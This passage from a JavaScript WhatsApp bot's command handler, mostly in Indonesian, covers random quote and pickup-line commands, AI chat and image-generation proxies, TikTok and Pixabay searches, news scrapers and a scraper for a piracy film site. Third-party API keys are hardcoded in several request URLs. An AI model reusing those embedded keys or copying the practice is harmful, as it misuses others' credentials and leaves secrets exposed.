"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
//=========================================\\======
case 'forbidden1': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "You are not teman yang selalu di sampingku dalam keadaan senang maupun susah THANK YOU kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjMoneyan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjMoney sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
//=========================================\\======
case 'forbidden2': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua Time: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
//=========================================\\======
case 'forbidden3': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "You are not terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
//=========================================\\======
case 'forbidden4':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjMoneyan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  reply(bacotan)
}
break//==================================================================

case 'youai': {
  if (!text) return replydare(`Example : ${command} who is elon musk`)
  reply(mess.wait)
const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=You are not 𝐁𝐌𝐁 🙂 `)
    const msgai = data1.result;
replydare(`${msgai}`)
}
break
//==================================================================

case 'tiktoksearch':
case 'carivideotiktok':
case 'ttsearch': {
  if (!text) return reply('_What are you looking for?_');
  reply(mess.wait);
  try {
    const data = await fetchJson(`https://skizo.tech/api/tiktok-search?apikey=nanogembul&keywords=${encodeURIComponent(text)}`);
    const video = data[0]; // Assuming the first video in the search results is used
    if (!video) return reply('_Video not found_');
    const caption = `_⚡"Tiktok Search By ${botname}_\n\n*Title:* ${video.title}\n*Region:* ${video.region}\n*Duration:* ${video.duration} detik\n*Dibuat oleh:* ${video.music_info.author}\n*Jumlah Like:* ${video.digg_count}\n*Jumlah Komentar:* ${video.comment_count}\n*Jumlah Share:* ${video.share_count}\n*Jumlah Tonton:* ${video.play_count}`;

    const videoMessage = {
      video: { url: video.play },
      caption: caption,
      jpegThumbnail: await getBuffer(video.cover), // Assuming getBuffer is a function to fetch image buffer
      contextInfo: {
        externalAdReply: {
          title: video.title,
          body: `By ${video.music_info.author}`,
          mediaType: 2,
          thumbnail: await getBuffer(video.cover),
          mediaUrl: video.play,
          sourceUrl: video.play
        }
      }
    };

    await Dare.sendMessage(m.chat, videoMessage, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('_Sorry, an error occurred while searching for TikTok_');
  }
}
break;
//==================================================================
case 'viral':{
  if (!DareTheCreator) return reply(mess.only.owner)
  reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./database/anuu.json'))
var hasil = pickRandom(asupan)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}
break
//==================================================================
case 'midjourney':
case 'mdjourney': {
  if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	Dare.sendMessage(from, { image: {url:hasilnan}}, { quoted: m })
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed, type .report or .reportbug')
	}
}
break;
//==================================================================
//==================================================================
case 'text2image':
case 'txt2img': {
if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	Dare.sendMessage(from, { image: {url:hasilnan}}, { quoted: m })
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}
break
//=============================================================
case 'anything': {
  if (!q) return reply('where is the prompt Sir?')
reply(mess.wait)
	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	Dare.sendMessage(from, { image: {url:hasilnan}}, { quoted: m })
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}
break
//=============================================================
case 'absolutely': {
  if (!q) return reply('where is the prompt Sir?')
reply(mess.wait)
	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	Dare.sendMessage(from, { image: {url:hasilnan}}, { quoted: m })
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}
break
case 'pixabay': {
async function formatNumber(integer) {
      let numb = parseInt(integer)
      return Number(numb).toLocaleString().replace(/,/g, '.')
   }
      if (!text) return reply(`*• Example :* ${prefix + command} *[type query]*
 
List Type :
* *Image*
* *Video*`)
   let keyword = text.split(" ")[0];
   let data = text.slice(keyword.length + 1);
    if (keyword.toLowerCase() === "image") {
        if (!data) return reply( `*• Example :* ${prefix + command} image *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
   let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Size :* ${rand.imageWidth} x ${rand.imageHeight}
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await Dare.sendMessage(m.chat, { 
              text: cap 
              }, {
            quoted: m 
         });
       await Dare.sendMessage(m.chat, {
            image: {
              url: rand.largeImageURL
            }}, {
            quoted: m
         });
         } else if (keyword.toLowerCase() === "video") {
      if (!data) return reply( `*• Example :* ${prefix + command} video *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/videos?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
     let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Duration :* ${rand.duration} seconds
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await Dare.sendMessage(m.chat, {
            image: {
              url: rand.videos["medium"].thumbnail
               },
             caption: cap
            }, {
            quoted: m
         });
       await Dare.sendMessage(m.chat, {
            video: {
              url: rand.videos["medium"].url
             },
          gifPlayBack: true
         }, {
            quoted: m
         });
      }
  } 
  break
//=================================//
 case 'fajar':{
FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
}
break
//=================================================//
case 'cnn': {
CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
}
break
//=================================================//
case 'layarkaca': {
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
}
break
//=================================================//
case 'cnbc': {
    try {
        CNBCNews().then(async (res) => {
            let no = 0;
            let iwannnn = "";
            for (let i of res) {
                no += 1;
                iwannnn += `\n• ${no.toString()} •\n`;
                iwannnn += `Berita: ${i.berita}\n`;
                iwannnn += `Upload: ${i.berita_diupload}\n`;
                iwannnn += `Link: ${i.berita_url}\n`;
            }
            iwannnn += "";

            const thumb = res[0]?.berita_thumb || ''; // Pastikan 'berita_thumb' tidak undefined
            await Dare.sendMessage(m.chat, { 
                image: { url: thumb }, 
                caption: iwannnn 
            }, { quoted: m });
        }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break;

//=================================================//
case 'tribun': {
  try {
TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'indozone': {
